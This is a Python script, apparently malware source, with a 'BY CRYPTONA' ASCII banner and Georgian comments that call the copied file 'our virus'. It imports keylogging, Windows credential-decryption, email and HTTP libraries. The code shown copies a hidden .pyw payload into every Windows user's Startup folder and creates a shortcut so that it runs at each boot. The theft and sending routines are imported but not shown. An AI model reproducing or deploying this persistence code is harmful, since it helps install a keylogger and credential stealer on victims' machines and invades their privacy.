print("""
 _______  __   __    _______  ______    __   __  _______  _______  _______  __    _  _______ 
|  _    ||  | |  |  |       ||    _ |  |  | |  ||       ||       ||       ||  |  | ||   _   |
| |_|   ||  |_|  |  |       ||   | ||  |  |_|  ||    _  ||_     _||   _   ||   |_| ||  |_|  |
|       ||       |  |       ||   |_||_ |       ||   |_| |  |   |  |  | |  ||       ||       |
|  _   | |_     _|  |      _||    __  ||_     _||    ___|  |   |  |  |_|  ||  _    ||       |
| |_|   |  |   |    |     |_ |   |  | |  |   |  |   |      |   |  |       || | |   ||   _   |
|_______|  |___|    |_______||___|  |_|  |___|  |___|      |___|  |_______||_|  |__||__| |__|
""")
###################################################################################################

import os


#ბიბლიოთეკების იპორტი
from pynput.keyboard import Key, Listener
import  random, time, socket, sqlite3
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import sqlite3
import shutil
import sys
import json,base64
import requests
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import (
    Cipher, algorithms, modes)
import win32crypt
import json,base64
import requests
import platform
import zipfile
import smtplib
from glob import glob

import shutil

import os, winshell
from win32com.client import Dispatch


original = r'system128xx\system128.pyw'

#ვნახოთ ყველა იუზერი და დყაყოყ ჩვენი ვირუსით
for x in glob(r'C:\Users\\*'):
    user = x.split('\\')[2]
    WorkingDirectory = f'C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
    targetpath = f'C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\system128.pyw'
    path = f'C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\shotcut.lnk'
    
 

    
    
   
    try:
        #დავაკოპიროთ ჩვენი ვირუსი
        shutil.copy(original,targetpath)
        shell = Dispatch('WScript.Shell')

        #შევქმნათ ვირუსის შორთქათი რომელიც მოგვცემს საშუალებას
        #რომ მოწყობილობის ყოველ ჩართვაზე  გავუშვათ ვირუსი
        shortcut = shell.CreateShortCut(path)
        shortcut.Targetpath = targetpath
        shortcut.WorkingDirectory = WorkingDirectory
        shortcut.save()
        print("copyed!" + user)
    except:
        print("error!" + user)



